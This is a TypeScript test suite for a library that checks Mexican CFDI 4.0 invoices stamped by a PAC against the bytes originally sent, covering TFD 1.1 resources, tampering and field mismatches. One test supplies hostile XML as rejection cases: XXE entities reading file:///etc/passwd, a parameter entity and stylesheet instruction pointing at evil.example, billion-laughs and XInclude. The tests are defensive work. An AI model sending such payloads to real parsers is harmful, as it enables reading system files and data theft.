import assert from "node:assert/strict";
import { before, test } from "node:test";
import { createHash } from "node:crypto";
import dns from "node:dns";
import fs from "node:fs";
import http from "node:http";
import https from "node:https";
import net from "node:net";
import { readFile } from "node:fs/promises";
import { join } from "node:path";
import manifest from "../src/lib/sat/cfdi40/manifest.json";
import tfdSource from "../src/lib/sat/cfdi40/tfd11.json";
import type { Cfdi40XsdEngine } from "../src/lib/cfdi40/schema";
import {
  StampedCfdiError,
  isStampedCfdi40,
  verifyStampedCfdi40,
  verifyTfdForSentCfdi40,
  type StampedCfdiProblem,
} from "../src/lib/cfdi40/stamped";
import {
  compileStampedCfdi40Xsd,
  stampedCfdi40XsdSet,
  stampedXsdWrapperUrl,
} from "../src/lib/cfdi40/stamped-schema";
import {
  tfd11XsdUrl,
  tfd11XsltUrl,
  verifyTfd11Bundle,
  type Tfd11BundleSource,
} from "../src/lib/cfdi40/tfd-resources";
import { loadCfdi40XsdBundle } from "../src/lib/cfdi40/xsd-resources";
import type { XsdValidatedCfdi40 } from "../src/lib/cfdi40/types";
import type { PacStampEvidence } from "../src/lib/pac/types";
import {
  fixtureNames,
  pacRfc,
  satCertificateNumber,
  simulateStamp,
  stampingKit,
  type SimulatedStamp,
  type StampingKit,
} from "./fixtures/stamping";

// Fase 5C.8: verification of a PAC response against the CFDI sent. Every sent CFDI goes
// through the real pipeline (synthetic CSD); every "PAC response" is a SIMULATION of the
// documented SW v4 shape. The official cfdv40 + TFD 1.1 XSD set, the official TFD XSLT and
// the approved engines run for real; nothing here proves SAT validity of a stamp.

let kit: StampingKit;
const sent = new Map<string, XsdValidatedCfdi40>();
before(async () => {
  kit = await stampingKit();
  for (const name of fixtureNames) sent.set(name, kit.validate(kit.seal(name)));
});

const evidenceOf = (
  stamp: Pick<SimulatedStamp, "cfdi" | "data">,
  overrides: {
    cfdi?: string;
    fields?: Record<string, string>;
    tfd?: string;
  } = {},
): PacStampEvidence => {
  const fields = Object.fromEntries(
    Object.entries(stamp.data).filter(
      ([key]) => key !== "cfdi" && key !== "qrCode",
    ),
  );
  return {
    cfdi: new Uint8Array(Buffer.from(overrides.cfdi ?? stamp.cfdi, "utf8")),
    tfd: overrides.tfd
      ? new Uint8Array(Buffer.from(overrides.tfd, "utf8"))
      : null,
    fields: { ...fields, ...overrides.fields },
  };
};
const problemOf = (action: () => unknown): StampedCfdiProblem | "OK" => {
  try {
    action();
    return "OK";
  } catch (error) {
    if (error instanceof StampedCfdiError) return error.problem;
    throw error;
  }
};

test("TFD 1.1 resources: versioned byte-exact, in the manifest, XSD imports only tdCFDI, XSLT includes nothing", async () => {
  const entries = manifest.resources.filter((r) => r.kind.startsWith("TFD_"));
  assert.deepEqual(
    entries.map((r) => [r.kind, r.url, r.sha256]),
    [
      [
        "TFD_XSD",
        tfd11XsdUrl,
        "fb3d061fe9914500bef8beb3ea2e8722ee8a8224fa3af63643877a64c0ea05f7",
      ],
      [
        "TFD_XSLT",
        tfd11XsltUrl,
        "d7807e936d5a768cec5dca7a35a8b6dd515287083ca9dd7424c1b722c4b0d5a6",
      ],
    ],
  );
  for (const entry of entries) {
    const stored = await readFile(join("resources/sat/cfdi40", entry.name));
    assert.equal(
      createHash("sha256").update(stored).digest("hex"),
      entry.sha256,
    );
    assert.equal(stored.length, entry.bytes);
    assert(
      entry.lastModified && entry.etag && entry.obtainedAt === "2026-10-14",
    );
  }
  const bundle = verifyTfd11Bundle(tfdSource);
  assert.deepEqual(bundle.xsd.imports, [
    "http://www.sat.gob.mx/sitio_internet/cfd/tipoDatos/tdCFDI/tdCFDI.xsd",
  ]);
  assert(
    Buffer.from(bundle.xsd.bytes).equals(
      await readFile("resources/sat/cfdi40/TimbreFiscalDigitalv11.xsd"),
    ),
  );
  assert.equal(
    bundle.xslt.text,
    await readFile("resources/sat/cfdi40/cadenaoriginal_TFD_1_1.xslt", "utf8"),
  );
});

test("a modified, re-pointed or extended TFD resource fails closed", () => {
  const source = tfdSource as Tfd11BundleSource;
  const code = (value: Tfd11BundleSource) => {
    try {
      verifyTfd11Bundle(value);
      return "OK";
    } catch (error) {
      return (
        (error as { issues?: { code: string }[] }).issues?.[0]?.code ?? "OTHER"
      );
    }
  };
  assert.equal(code(source), "OK");
  assert.equal(
    code({
      ...source,
      xsd: {
        ...source.xsd,
        text: source.xsd.text.replace('fixed="1.1"', 'fixed="1.2"'),
      },
    }),
    "CFDI_XSD_SCHEMA_INTEGRITY_FAILED",
  );
  assert.equal(
    code({
      ...source,
      xsd: { ...source.xsd, url: "https://evil.example/tfd.xsd" },
    }),
    "CFDI_XSD_SCHEMA_UNAVAILABLE",
  );
  assert.equal(
    code({ ...source, xslt: { ...source.xslt, text: source.xslt.text + " " } }),
    "SAT_XSLT_RESOURCE_INTEGRITY_FAILED",
  );
  assert.equal(
    code({ ...source, xslt: { ...source.xslt, url: tfd11XsdUrl } }),
    "SAT_XSLT_RESOURCE_MISSING",
  );
});

test("stamped XSD set: ORBIT wrapper with no rules, compiled once, loading exactly cfdv40, catCFDI, tdCFDI and the TFD schema", async () => {
  const set = kit.verification.set;
  assert.equal(set.wrapper.url, stampedXsdWrapperUrl);
  const wrapper = Buffer.from(set.wrapper.bytes).toString("utf8");
  assert.equal((wrapper.match(/<xs:import /g) ?? []).length, 2);
  assert(!/<xs:(element|attribute|complexType|simpleType|any)\b/.test(wrapper));
  assert.deepEqual(
    [...set.schemas.keys()].sort(),
    [
      "http://www.sat.gob.mx/sitio_internet/cfd/4/cfdv40.xsd",
      tfd11XsdUrl,
      "http://www.sat.gob.mx/sitio_internet/cfd/catalogos/catCFDI.xsd",
      "http://www.sat.gob.mx/sitio_internet/cfd/tipoDatos/tdCFDI/tdCFDI.xsd",
    ].sort(),
  );
  assert.match(set.setSha256, /^[0-9a-f]{64}$/);
  // Integrity: an engine asking for anything else fails closed.
  const requested: string[] = [];
  const greedy: Cfdi40XsdEngine = {
    id: "probe",
    compile(_root, load) {
      for (const url of [
        ...set.schemas.keys(),
        "http://www.sat.gob.mx/sitio_internet/cfd/extra.xsd",
      ]) {
        requested.push(url);
        load(url);
      }
      return {
        validate: () => [],
        inspect: () => ({ diagnostics: [], tree: null }),
      };
    },
  };
  assert.throws(
    () => compileStampedCfdi40Xsd(greedy, set),
    /CFDI40_BUILD_FAILED|Cfdi40/,
  );
  const lazy: Cfdi40XsdEngine = {
    id: "lazy",
    compile: () => ({
      validate: () => [],
      inspect: () => ({ diagnostics: [], tree: null }),
    }),
  };
  assert.throws(() => compileStampedCfdi40Xsd(lazy, set));
  // The real engine: same compiled object for the same set.
  const first = compileStampedCfdi40Xsd(kit.verification.engine, set);
  assert.equal(compileStampedCfdi40Xsd(kit.verification.engine, set), first);
  // A TFD that imports an unversioned schema is refused when building the set.
  const bundle = await loadCfdi40XsdBundle();
  assert.throws(() =>
    stampedCfdi40XsdSet(bundle, {
      ...kit.verification.xslt.tfd,
      xsd: {
        ...kit.verification.xslt.tfd.xsd,
        imports: ["http://www.sat.gob.mx/x.xsd"],
      },
    }),
  );
});

test("every supported CFDI: a PAC stamp verifies against the bytes sent, TFD bound to the Sello, cadena from the official XSLT", () => {
  for (const name of fixtureNames) {
    const cfdi = sent.get(name)!;
    const stamp = simulateStamp(kit, cfdi);
    const result = verifyStampedCfdi40(
      cfdi,
      evidenceOf(stamp),
      kit.verification,
    );
    assert(isStampedCfdi40(result), name);
    assert.equal(result.uuid, stamp.uuid.toLowerCase());
    assert.equal(
      result.tfd.uuid,
      stamp.uuid,
      "the XML keeps the UUID as written",
    );
    assert.equal(result.sentSha256, cfdi.sha256);
    assert.equal(result.xml, stamp.cfdi);
    assert.equal(result.tfd.rfcProvCertif, pacRfc);
    assert.equal(result.tfd.noCertificadoSAT, satCertificateNumber);
    assert.equal(result.satSealVerified, false);
    assert.equal(
      result.tfdCadenaOriginalSha256,
      createHash("sha256").update(stamp.cadena).digest("hex"),
    );
    assert.match(
      stamp.cadena,
      new RegExp(
        `^\\|\\|1\\.1\\|${stamp.uuid}\\|2026-10-12T12:31:00\\|${pacRfc}\\|[^|]+\\|${satCertificateNumber}\\|\\|$`,
      ),
    );
  }
});

test("an equivalent re-serialization by the PAC verifies: namespace declarations moved, attribute order, whitespace between elements, BOM", () => {
  const cfdi = sent.get("ingreso-multiples-conceptos")!;
  const stamp = simulateStamp(kit, cfdi);
  // xmlns:tfd declared on the root instead of the TFD, Version moved after LugarExpedicion,
  // and line breaks plus indentation between elements.
  const reordered = stamp.cfdi
    .replace(
      "<cfdi:Comprobante ",
      '<cfdi:Comprobante xmlns:tfd="http://www.sat.gob.mx/TimbreFiscalDigital" ',
    )
    .replace(' Version="4.0"', "")
    .replace(
      / LugarExpedicion="([0-9]{5})"/,
      ' LugarExpedicion="$1"  Version="4.0"',
    )
    .replace(
      /<tfd:TimbreFiscalDigital xmlns:tfd="[^"]+" /,
      "<tfd:TimbreFiscalDigital ",
    )
    .replace(/></g, ">\r\n  <");
  assert.notEqual(reordered, stamp.cfdi);
  assert.equal(reordered.match(/Version="4.0"/g)?.length, 1);
  for (const variant of [reordered, "﻿" + stamp.cfdi]) {
    const result = verifyStampedCfdi40(
      cfdi,
      evidenceOf(stamp, { cfdi: variant }),
      kit.verification,
    );
    assert.equal(
      result.xml,
      variant,
      "the stamped XML is kept exactly as received",
    );
  }
});

test("fiscal content changed by the PAC is rejected: amounts, RFC, Fecha, concepts, Sello, NoCertificado, Certificado, schemaLocation", () => {
  const cfdi = sent.get("ingreso-retenciones-persona-moral")!;
  const stamp = simulateStamp(kit, cfdi);
  const mutate = (from: RegExp, to: string) => {
    const changed = stamp.cfdi.replace(from, to);
    assert.notEqual(changed, stamp.cfdi, String(from));
    return problemOf(() =>
      verifyStampedCfdi40(
        cfdi,
        evidenceOf(stamp, { cfdi: changed }),
        kit.verification,
      ),
    );
  };
  const expectations: [RegExp, string, StampedCfdiProblem][] = [
    [/Total="([0-9.]+)"/, 'Total="1.00"', "STAMPED_CFDI_CONTENT_CHANGED"],
    [
      /(<cfdi:Receptor [^>]*?)Rfc="[^"]+"/,
      '$1Rfc="XAXX010101000"',
      "STAMPED_CFDI_CONTENT_CHANGED",
    ],
    [
      /Fecha="([^"]+)"/,
      'Fecha="2026-10-11T12:30:15"',
      "STAMPED_CFDI_CONTENT_CHANGED",
    ],
    [
      /Descripcion="([^"]+)"/,
      'Descripcion="Otro concepto"',
      "STAMPED_CFDI_CONTENT_CHANGED",
    ],
    // The Sello of the Comprobante is fiscal content: any change is detected before the TFD.
    [/ Sello="([A-Za-z0-9+/])/, ' Sello="Z', "STAMPED_CFDI_CONTENT_CHANGED"],
    [
      /NoCertificado="30001000000000000001"/,
      'NoCertificado="30001000000000000002"',
      "STAMPED_CFDI_CONTENT_CHANGED",
    ],
    [/Certificado="MII/, 'Certificado="MIJ', "STAMPED_CFDI_CONTENT_CHANGED"],
    [
      /(<cfdi:Comprobante [^>]*?xsi:schemaLocation=")[^"]+"/,
      '$1http://www.sat.gob.mx/cfd/4 http://www.sat.gob.mx/sitio_internet/cfd/4/cfdv40.xsd http://www.sat.gob.mx/TimbreFiscalDigital http://www.sat.gob.mx/sitio_internet/cfd/TimbreFiscalDigital/TimbreFiscalDigitalv11.xsd"',
      "STAMPED_CFDI_CONTENT_CHANGED",
    ],
    [
      /<cfdi:Emisor /,
      '<cfdi:Emisor FacAtrAdquirente="0123456789" ',
      "STAMPED_CFDI_CONTENT_CHANGED",
    ],
  ];
  for (const [from, to, problem] of expectations)
    assert.equal(mutate(from, to), problem, String(from));
});

test("TFD problems are rejected with stable codes", () => {
  const cfdi = sent.get("ingreso-pue-iva16")!;
  const stamp = simulateStamp(kit, cfdi);
  const tfdNode = /<tfd:TimbreFiscalDigital [^>]*\/>/.exec(stamp.cfdi)![0];
  const withTfd = (node: string) => stamp.cfdi.replace(tfdNode, node);
  const verify = (xml: string, fields?: Record<string, string>) =>
    problemOf(() =>
      verifyStampedCfdi40(
        cfdi,
        evidenceOf(stamp, { cfdi: xml, fields }),
        kit.verification,
      ),
    );
  const noComplement = stamp.cfdi.replace(
    /<cfdi:Complemento>.*<\/cfdi:Complemento>/,
    "",
  );
  const cases: [string, string, StampedCfdiProblem][] = [
    ["no Complemento", noComplement, "TFD_MISSING"],
    ["empty Complemento", withTfd(""), "TFD_UNEXPECTED_CONTENT"],
    ["two TFD", withTfd(tfdNode + tfdNode), "TFD_UNEXPECTED_CONTENT"],
    [
      "two Complemento",
      stamp.cfdi.replace(
        "<cfdi:Complemento>",
        "<cfdi:Complemento></cfdi:Complemento><cfdi:Complemento>",
      ),
      "STAMPED_CFDI_XSD_INVALID",
    ],
    [
      "Version 1.0",
      withTfd(tfdNode.replace('Version="1.1"', 'Version="1.0"')),
      "STAMPED_CFDI_XSD_INVALID",
    ],
    [
      "bad UUID",
      withTfd(
        tfdNode.replace(
          /UUID="[^"]+"/,
          'UUID="not-a-uuid-0000-0000-000000000000"',
        ),
      ),
      "STAMPED_CFDI_XSD_INVALID",
    ],
    [
      "nil UUID",
      withTfd(
        tfdNode.replace(
          /UUID="[^"]+"/,
          'UUID="00000000-0000-0000-0000-000000000000"',
        ),
      ),
      "TFD_UUID_INVALID",
    ],
    [
      "SelloCFD of another CFDI",
      withTfd(
        tfdNode.replace(/SelloCFD="[^"]+"/, `SelloCFD="${"A".repeat(342)}=="`),
      ),
      "TFD_SELLO_CFD_MISMATCH",
    ],
    [
      "NoCertificadoSAT short",
      withTfd(
        tfdNode.replace(/NoCertificadoSAT="[^"]+"/, 'NoCertificadoSAT="123"'),
      ),
      "STAMPED_CFDI_XSD_INVALID",
    ],
    [
      "FechaTimbrado invalid",
      withTfd(
        tfdNode.replace(
          /FechaTimbrado="[^"]+"/,
          'FechaTimbrado="2026-02-30T10:00:00"',
        ),
      ),
      "STAMPED_CFDI_XSD_INVALID",
    ],
    [
      "RfcProvCertif person",
      withTfd(
        tfdNode.replace(
          /RfcProvCertif="[^"]+"/,
          'RfcProvCertif="PEMA800101AB3"',
        ),
      ),
      "STAMPED_CFDI_XSD_INVALID",
    ],
    [
      "SelloSAT constant",
      withTfd(
        tfdNode.replace(/SelloSAT="[^"]+"/, `SelloSAT="${"A".repeat(344)}"`),
      ),
      "TFD_SELLO_SAT_INVALID",
    ],
    [
      "SelloSAT not base64",
      withTfd(tfdNode.replace(/SelloSAT="[^"]+"/, 'SelloSAT="@@@"')),
      "TFD_SELLO_SAT_INVALID",
    ],
    [
      "extra TFD attribute",
      withTfd(
        tfdNode.replace(
          "<tfd:TimbreFiscalDigital ",
          '<tfd:TimbreFiscalDigital Extra="1" ',
        ),
      ),
      "STAMPED_CFDI_XSD_INVALID",
    ],
    [
      "TFD with a child",
      withTfd(
        tfdNode.replace(
          "/>",
          "><tfd:TimbreFiscalDigital/></tfd:TimbreFiscalDigital>",
        ),
      ),
      "STAMPED_CFDI_XSD_INVALID",
    ],
    [
      "another complement besides the TFD",
      stamp.cfdi.replace(
        "</cfdi:Complemento>",
        '<x:Otro xmlns:x="urn:otro"/></cfdi:Complemento>',
      ),
      "STAMPED_CFDI_UNSUPPORTED_NAMESPACE",
    ],
    [
      "TFD in another namespace",
      withTfd(
        tfdNode.replace(
          'xmlns:tfd="http://www.sat.gob.mx/TimbreFiscalDigital"',
          'xmlns:tfd="http://www.sat.gob.mx/TimbreFiscalDigital2"',
        ),
      ),
      "STAMPED_CFDI_UNSUPPORTED_NAMESPACE",
    ],
    [
      "TFD other schemaLocation",
      withTfd(
        tfdNode.replace(
          /xsi:schemaLocation="[^"]+"/,
          'xsi:schemaLocation="http://www.sat.gob.mx/TimbreFiscalDigital https://evil.example/tfd.xsd"',
        ),
      ),
      "TFD_UNEXPECTED_CONTENT",
    ],
  ];
  for (const [label, xml, problem] of cases)
    assert.equal(verify(xml), problem, label);
});

test("markup, encoding and size attacks in the PAC response never reach the parser or fail closed", () => {
  const cfdi = sent.get("ingreso-pue-iva16")!;
  const stamp = simulateStamp(kit, cfdi);
  const verifyBytes = (bytes: Uint8Array) =>
    problemOf(() =>
      verifyStampedCfdi40(
        cfdi,
        { ...evidenceOf(stamp), cfdi: bytes },
        kit.verification,
      ),
    );
  const text = (xml: string) => new Uint8Array(Buffer.from(xml, "utf8"));
  const body = stamp.cfdi.replace(/^<\?xml[^>]*\?>/, "");
  const cases: [string, Uint8Array, StampedCfdiProblem][] = [
    [
      "DOCTYPE + external entity (XXE)",
      text(
        `<?xml version="1.0"?><!DOCTYPE c [<!ENTITY x SYSTEM "file:///etc/passwd">]>${body}`,
      ),
      "STAMPED_CFDI_FORBIDDEN_MARKUP",
    ],
    [
      "parameter entity",
      text(
        `<?xml version="1.0"?><!DOCTYPE c [<!ENTITY % p SYSTEM "http://evil.example/p.dtd"> %p;]>${body}`,
      ),
      "STAMPED_CFDI_FORBIDDEN_MARKUP",
    ],
    [
      "billion laughs",
      text(
        `<?xml version="1.0"?><!DOCTYPE c [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;&a;">]>${body}`,
      ),
      "STAMPED_CFDI_FORBIDDEN_MARKUP",
    ],
    [
      "comment",
      text(
        stamp.cfdi.replace(
          "<cfdi:Complemento>",
          "<!-- x --><cfdi:Complemento>",
        ),
      ),
      "STAMPED_CFDI_FORBIDDEN_MARKUP",
    ],
    [
      "CDATA",
      text(
        stamp.cfdi.replace(
          "<cfdi:Complemento>",
          "<cfdi:Complemento><![CDATA[x]]>",
        ),
      ),
      "STAMPED_CFDI_FORBIDDEN_MARKUP",
    ],
    [
      "processing instruction",
      text(
        stamp.cfdi.replace(
          "<cfdi:Complemento>",
          '<?xml-stylesheet href="http://evil.example"?><cfdi:Complemento>',
        ),
      ),
      "STAMPED_CFDI_FORBIDDEN_MARKUP",
    ],
    [
      "XInclude",
      text(
        stamp.cfdi.replace(
          "<cfdi:Complemento>",
          '<cfdi:Complemento><xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd"/>',
        ),
      ),
      "STAMPED_CFDI_UNSUPPORTED_NAMESPACE",
    ],
    [
      "not UTF-8",
      new Uint8Array([
        ...Buffer.from(stamp.cfdi.slice(0, 200)),
        0xff,
        0xfe,
        ...Buffer.from(stamp.cfdi.slice(200)),
      ]),
      "STAMPED_CFDI_ENCODING",
    ],
    [
      "malformed",
      text(stamp.cfdi.replace("</cfdi:Complemento>", "")),
      "STAMPED_CFDI_MALFORMED",
    ],
    [
      "oversized",
      new Uint8Array(4 * 1024 * 1024 + 1).fill(0x20),
      "STAMPED_CFDI_TOO_LARGE",
    ],
    ["empty", new Uint8Array(0), "STAMPED_CFDI_MISSING"],
  ];
  for (const [label, bytes, problem] of cases)
    assert.equal(verifyBytes(bytes), problem, label);
});

test("parallel PAC fields must match the TFD: a UUID or TFD alone never stamps a CFDI", () => {
  const cfdi = sent.get("ingreso-ppd")!;
  const stamp = simulateStamp(kit, cfdi);
  const other = simulateStamp(kit, cfdi);
  const verify = (overrides: Parameters<typeof evidenceOf>[1]) =>
    problemOf(() =>
      verifyStampedCfdi40(cfdi, evidenceOf(stamp, overrides), kit.verification),
    );
  assert.equal(verify({ fields: { uuid: stamp.uuid.toLowerCase() } }), "OK");
  assert.equal(verify({ fields: { uuid: other.uuid } }), "PAC_FIELDS_MISMATCH");
  assert.equal(
    verify({ fields: { selloSAT: other.tfd.SelloSAT } }),
    "PAC_FIELDS_MISMATCH",
  );
  assert.equal(verify({ fields: { selloCFDI: "x" } }), "PAC_FIELDS_MISMATCH");
  assert.equal(
    verify({ fields: { noCertificadoSAT: "30001000000400002434" } }),
    "PAC_FIELDS_MISMATCH",
  );
  assert.equal(
    verify({ fields: { noCertificadoCFDI: "30001000000000000009" } }),
    "PAC_FIELDS_MISMATCH",
  );
  assert.equal(
    verify({ fields: { fechaTimbrado: "2026-10-12T12:31:01" } }),
    "PAC_FIELDS_MISMATCH",
  );
  assert.equal(
    verify({ fields: { cadenaOriginalSAT: other.cadena } }),
    "TFD_CADENA_MISMATCH",
  );
  assert.equal(verify({ tfd: stamp.tfdXml }), "OK");
  assert.equal(verify({ tfd: other.tfdXml }), "PAC_FIELDS_MISMATCH");
  // Evidence without the CFDI: no stamp.
  assert.equal(
    problemOf(() =>
      verifyStampedCfdi40(
        cfdi,
        {
          cfdi: null,
          tfd: new Uint8Array(Buffer.from(stamp.tfdXml)),
          fields: { uuid: stamp.uuid },
        },
        kit.verification,
      ),
    ),
    "STAMPED_CFDI_MISSING",
  );
  // A standalone TFD can be checked against the CFDI sent (reconciliation evidence only).
  assert.deepEqual(
    verifyTfdForSentCfdi40(
      cfdi,
      new Uint8Array(Buffer.from(stamp.tfdXml)),
      kit.verification,
    ),
    {
      uuid: stamp.uuid.toLowerCase(),
    },
  );
  const foreign = simulateStamp(kit, sent.get("ingreso-exento")!);
  assert.equal(
    problemOf(() =>
      verifyTfdForSentCfdi40(
        cfdi,
        new Uint8Array(Buffer.from(foreign.tfdXml)),
        kit.verification,
      ),
    ),
    "TFD_SELLO_CFD_MISMATCH",
  );
});

test("a stamp of another CFDI is never accepted, and only ORBIT-verified values are StampedCfdi40", () => {
  const cfdi = sent.get("ingreso-descuento")!;
  const foreign = simulateStamp(kit, sent.get("ingreso-usd-tipo-cambio")!);
  assert.notEqual(
    problemOf(() =>
      verifyStampedCfdi40(cfdi, evidenceOf(foreign), kit.verification),
    ),
    "OK",
  );
  assert.equal(
    problemOf(() =>
      verifyStampedCfdi40(
        { ...cfdi } as XsdValidatedCfdi40,
        evidenceOf(simulateStamp(kit, cfdi)),
        kit.verification,
      ),
    ),
    "SENT_CFDI_REQUIRED",
  );
  const stamped = verifyStampedCfdi40(
    cfdi,
    evidenceOf(simulateStamp(kit, cfdi)),
    kit.verification,
  );
  assert.equal(isStampedCfdi40({ ...stamped }), false);
  (stamped.bytes as Uint8Array)[10] ^= 1;
  assert.equal(isStampedCfdi40(stamped), false);
});

test("reconciliation restore: only the exact sealed bytes, their signed cadena and a valid Sello become SealedCfdi40Xml again", async () => {
  const { restoreSealedCfdi40, isSealedCfdi40 } =
    await import("../src/lib/cfdi40/sealed");
  const { compileCfdi40Xslt } =
    await import("../src/lib/cfdi40/original-string");
  const { cfdi40XsltEngine } = await import("../src/lib/cfdi40/xslt-engine");
  const { loadCfdi40XsltBundle } =
    await import("../src/lib/cfdi40/xslt-resources");
  const stylesheet = compileCfdi40Xslt(
    cfdi40XsltEngine,
    await loadCfdi40XsltBundle(),
  );
  const original = kit.seal("ingreso-ppd");
  const stored = {
    bytes: new Uint8Array(original.bytes),
    sha256: original.sha256,
    preSealSha256: original.preSealSha256,
    originalStringSha256: original.originalStringSha256,
  };
  const restored = restoreSealedCfdi40(stored, stylesheet);
  assert(isSealedCfdi40(restored));
  assert.equal(restored.xml, original.xml);
  assert.deepEqual(restored.certificate, original.certificate);
  assert.equal(kit.validate(restored).sha256, original.sha256);
  const sealFailed = (error: unknown) =>
    (error as { issues?: { code: string }[] }).issues?.[0]?.code ===
    "CFDI_SEAL_VERIFICATION_FAILED";
  // Changed content with a recomputed hash: the cadena and the Sello no longer match.
  const changed = Buffer.from(
    original.xml.replace(/Total="([0-9.]+)"/, 'Total="1.00"'),
  );
  assert.throws(
    () =>
      restoreSealedCfdi40(
        {
          ...stored,
          bytes: new Uint8Array(changed),
          sha256: createHash("sha256").update(changed).digest("hex"),
        },
        stylesheet,
      ),
    sealFailed,
  );
  assert.throws(
    () =>
      restoreSealedCfdi40({ ...stored, sha256: "0".repeat(64) }, stylesheet),
    sealFailed,
  );
  assert.throws(
    () =>
      restoreSealedCfdi40(
        { ...stored, originalStringSha256: "0".repeat(64) },
        stylesheet,
      ),
    sealFailed,
  );
});

test("verifying makes no network, file or console access", () => {
  const cfdi = sent.get("ingreso-unicode-escape")!;
  const stamp = simulateStamp(kit, cfdi);
  const touched: string[] = [];
  const restore: (() => void)[] = [];
  const guard = (target: object, key: string) => {
    const original = (target as Record<string, unknown>)[key];
    (target as Record<string, unknown>)[key] = () => {
      touched.push(key);
      throw new Error("blocked " + key);
    };
    restore.push(() => ((target as Record<string, unknown>)[key] = original));
    void original;
  };
  for (const [target, keys] of [
    [globalThis, ["fetch"]],
    [http, ["request", "get"]],
    [https, ["request", "get"]],
    [net, ["connect", "createConnection"]],
    [dns, ["lookup"]],
    [fs, ["readFileSync", "openSync", "readFile"]],
    [console, ["log", "error", "warn", "info", "debug"]],
  ] as const)
    for (const key of keys) guard(target, key);
  try {
    verifyStampedCfdi40(cfdi, evidenceOf(stamp), kit.verification);
  } finally {
    for (const undo of restore.splice(0)) undo();
  }
  assert.deepEqual(touched, []);
});

test("stamped verification code: no network, files, eval or console; the SelloSAT gate stays pending", async () => {
  for (const file of [
    "src/lib/cfdi40/stamped.ts",
    "src/lib/cfdi40/stamped-schema.ts",
    "src/lib/cfdi40/tfd-resources.ts",
  ]) {
    const text = await readFile(file, "utf8");
    assert(
      !/\bfetch\(|node:(fs|http|https|net|dns|child_process)|\beval\(|new Function|\bconsole\./.test(
        text,
      ),
      file,
    );
  }
  const gates = await import("../src/lib/pac/production-gates");
  assert.deepEqual(
    { ...gates.productionPacGates },
    {
      PAC_SANDBOX_LIVE_VALIDATED: false,
      PAC_RECONCILIATION_LIVE_VALIDATED: false,
      TFD_SAT_SEAL_VERIFIED: false,
      PAC_PRODUCTION_CREDENTIALS: false,
    },
  );
});
